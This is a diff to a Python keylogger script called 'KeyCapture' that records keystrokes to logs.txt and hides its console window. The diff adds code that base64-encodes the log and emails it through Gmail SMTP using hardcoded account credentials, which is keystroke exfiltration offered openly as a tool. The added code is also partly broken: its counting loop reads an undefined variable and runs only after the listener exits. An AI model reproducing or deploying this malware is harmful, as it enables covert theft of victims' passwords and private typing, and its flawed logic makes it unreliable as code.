@@ -1,9 +1,10 @@
-try:	
-	from pynput import keyboard
-	import os, sys, win32gui, win32console, datetime, time
-except:
-    print("Please Install modules named Pynput, win32")
+#! /usr/bin/python3
+
+from pynput import keyboard
+import os, sys, win32gui, win32console, datetime, time, smtplib, base64
+
 	
+
 if os.path.exists("logs.txt") == False:
         file = open("logs.txt", "w")
         file.close()
@@ -12,23 +13,32 @@ print('''
     |----->         KEYCAPTURE KEYLOGGER\n                     
     |----->          MADE BY KULDIP <3                       
     |----->           IN PYTHON 3 \n                        
+
+    |----->Pretty! Simple and basic  keylogger for windows and Linux.\n
+    |----->             Thanks to:-					
+    |----->    Techwebspot for contribution in our script
+
     |----->Pretty! Simple and basic  keylogger for windows and linux.\n
     |----->             Thanks to:-					   
+
     |-----> YOUTUBE, THE LEGEND GOOGLE, ALL MY FRIENDS.	   
     |----->         sorry if i forgot someone.		       
     |----->    These helps to make this thing happen. ;)
-
 	
 	
 NOTE:- Logs.txt file will be saved in same directory where the script is.
+     And automatically sent to your given email address whe
+     500 words Have saved in Logs.txt
 				
 WINDOW IS HIDDING IN 10 SECONDS. TO END THE PROGRAM
 		    OPEN TASK MANAGER AND KILL
 		     PROCESS NAME "PYTHON"
 							   
-		HANKYOU FOR USING ME.
+		  THANK YOU FOR USING ME.
 	''')
 time.sleep(10)
+
+toaddr = input("Enter the mail id on which you need Log: ")
 
 def hide():
 	window = win32console.GetConsoleWindow()
@@ -171,10 +181,77 @@ def on_press(key):
                 logs = str(key)
                 file.write(logs[1])
 	
+try:
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+except KeyboardInterrupt:
+    print("\n\n[-] User Requested An Interrupt")
+    exit(0)    
+
+lines = 0
+words = 0
+characters = 0
+for file in infile:
+    wordslist = line.split()
+    lines = lines + 1
+    words = words + len(wordslist)
+    characters = characters + len(line)
+
+if characters >= 500:
+    filename = "logs.txt"
+
+    fo = open(filename, "rb")
+    filecontent = fo.read()
+
+    encodedcontent = base64.b64encode(filecontent)
+
+    marker = "AUNIQUEMARKER"
+
+    body ="""
+    Log of KeyCapture tool.
+    """
+
+    part1 = """From: From Person <me@fromdomain.net>
+    To: To Person <amrood.admin@gmail.com>
+    Subject: Sending Attachement
+    MIME-Version: 1.0
+    Content-Type: multipart/mixed; boundary=%s
+    --%s
+    """ % (marker, marker)
 
 
+    part2 = """Content-Type: text/plain
+    Content-Transfer-Encoding:8bit
 
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+    %s
+    --%s
+    """ % (body,marker)
 
 
+    part3 = """Content-Type: multipart/mixed; name=\"%s\"
+    Content-Transfer-Encoding:base64
+    Content-Disposition: attachment; filename=%s
+
+    %s
+    --%s--
+    """ %(filename, filename, encodedcontent, marker)
+
+    message = part1 + part2 + part3
+
+
+    mail = smtplib.SMTP('smtp.gmail.com', 587)
+
+    mail.ehlo()
+
+    mail.starttls()
+
+    fromaddr = "loggerk27@gmail.com"
+
+    username = "loggerk27@gmail.com"
+    password = "sendmelogs"
+
+    mail.login(username, password)
+
+    mail.sendmail(fromaddr, toaddr, message)
+
+    mail.close()
